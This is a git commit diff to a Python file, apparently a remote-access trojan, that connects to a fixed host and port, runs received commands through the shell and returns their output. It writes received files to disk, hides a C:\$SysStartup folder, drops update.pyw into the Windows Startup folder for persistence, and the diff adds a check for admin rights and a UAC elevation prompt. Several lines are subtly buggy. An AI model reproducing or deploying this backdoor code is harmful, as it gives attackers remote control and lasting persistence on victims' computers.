83bbb7e18e829f4a5c62a52758adb39f5d1beaac
BrainFuzz-hub <failoni401@gmail.com>
2021-03-25 18:44:27 +0100

    test

--- code/plain.py
+++ code/plain.py
@@ -1,10 +1,11 @@
 import socket as s
 from subprocess import check_output, call
 from time import sleep
-from sys import exit
+from sys import exit, executable, argv
 from random import randint
 from os import getlogin
 import threading
+import ctypes
 
 HOST = "10.0.0.5"
 PORT = 420
@@ -21,104 +22,111 @@ a0001 = threading.Thread(target=a0001)
 a0001.start()
 
 """
-
-
-def connector():
+def isAdmin():
     try:
-        global client
-        client = s.socket(s.AF_INET, s.SOCK_STREAM)
-        client.connect(ADDR)
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if isAdmin():
+    def connector():
+        try:
+            global client
+            client = s.socket(s.AF_INET, s.SOCK_STREAM)
+            client.connect(ADDR)
+            recvMsg()
+        except (ConnectionRefusedError, TimeoutError):
+            print("retrying in 30 secs")
+            sleep(30)
+            connector()
+
+
+    def sendMsg(msg):
+        sendLength = str(len(msg)).encode(FORMAT)
+        client.send(sendLength)
+
+        client.send(msg.encode(FORMAT))
         recvMsg()
-    except (ConnectionRefusedError, TimeoutError):
-        print("retrying in 30 secs")
-        sleep(30)
-        connector()
 
 
-def sendMsg(msg):
-    sendLength = str(len(msg)).encode(FORMAT)
-    client.send(sendLength)
+    def process(message):
+        ctype = message[0]
+        if ctype == "c":
+            messageLst = message.split(" ")
+            mode = messageLst[1]
+            messageLst.pop(0)
+            messageLst.pop(0)
 
-    client.send(msg.encode(FORMAT))
-    recvMsg()
+            def comm():
+                return check_output(messageLst, shell=True).decode(FORMAT)
 
+            def tComm():
+                call(messageLst, shell=True)
 
-def process(message):
-    ctype = message[0]
-    if ctype == "c":
-        messageLst = message.split(" ")
-        mode = messageLst[1]
-        messageLst.pop(0)
-        messageLst.pop(0)
+            if mode == "o":
+                sendMsg(comm())
+            else:
+                threads = threading.Thread(target=tComm)
+                threads.start()
+                recvMsg()
 
-        def comm():
-            return check_output(messageLst, shell=True).decode(FORMAT)
+        elif ctype == "f":
+            msgNoType = message[1:]
+            mode = msgNoType[4]
+            msg = message[5:]
+            fType = msgNoType[0:3].replace(' ', '')
+            name = f"a{randint(100, 900)}.{fType}"
 
-        def tComm():
-            call(messageLst, shell=True)
+            with open(f"{name}", "w") as fileObj:
+                fileObj.write(msg)
 
-        if mode == "o":
-            sendMsg(comm())
-        else:
-            threads = threading.Thread(target=tComm)
-            threads.start()
+            if mode == "A":
+                if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
+                    call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
+                    with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
+                        if fType == "py" or "pyw":
+                            obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
+                            obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
+                            obj.write(f'b{name[0:4]}.start()')
+
+                    sendMsg(name)
+                else:
+                    call(["remove", name])
+                    sendMsg("err")
+            else:
+                call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
+                sendMsg(name)
+        elif ctype == "x":
+            call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
+            message = message[1:]
+            with open("pslib.pyw", "a") as libFile:
+                libFile.write(message)
+            call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
+            with open("update.pyw", "w") as updateFile:
+                updateFile.write(var)
+            call(["move", "update.pyw", "C:\\$SysStartup"], shell=True)
+            call(["cd", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"", "&&", "mklink", "\\update.pyw", "C:\\$SysStartup\\update.pyw"], shell=True)
             recvMsg()
 
-    elif ctype == "f":
-        msgNoType = message[1:]
-        mode = msgNoType[4]
-        msg = message[5:]
-        fType = msgNoType[0:3].replace(' ', '')
-        name = f"a{randint(100, 900)}.{fType}"
-
-        with open(f"{name}", "w") as fileObj:
-            fileObj.write(msg)
-
-        if mode == "A":
-            if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
-                call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
-                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
-                    if fType == "py" or "pyw":
-                        obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
-                        obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
-                        obj.write(f'b{name[0:4]}.start()')
-
-                sendMsg(name)
-            else:
-                call(["remove", name])
-                sendMsg("err")
         else:
-            call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
-            sendMsg(name)
-    elif ctype == "x":
-        call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
-        message = message[1:]
-        with open("pslib.pyw", "a") as libFile:
-            libFile.write(message)
-        call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
-        with open("update.pyw", "w") as updateFile:
-            updateFile.write(var)
-        call(["move", "update.pyw", "C:\\$SysStartup"], shell=True)
-        call(["cd", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"", "&&", "mlink", "update.pyw", "C:\\$SysStartup\\update.pyw"], shell=True)
-        recvMsg()
-
-    else:
-        if message == "!dsc":
-            client.close()
-            exit()
+            if message == "!dsc":
+                client.close()
+                exit()
 
 
-def recvMsg():
-    try:
-        msgLen = client.recv(BUFFER).decode(FORMAT)
+    def recvMsg():
+        try:
+            msgLen = client.recv(BUFFER).decode(FORMAT)
 
-        if msgLen and not "":
-            msgLen = int(msgLen)
-            msg = client.recv(int(msgLen)).decode(FORMAT)
-            process(msg)
-    except (TimeoutError, ConnectionResetError):
-        sleep(30)
-        connector()
+            if msgLen and not "":
+                msgLen = int(msgLen)
+                msg = client.recv(int(msgLen)).decode(FORMAT)
+                process(msg)
+        except (TimeoutError, ConnectionResetError):
+            sleep(30)
+            connector()
 
 
-connector()
+    connector()
+else:
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv), None, 1)
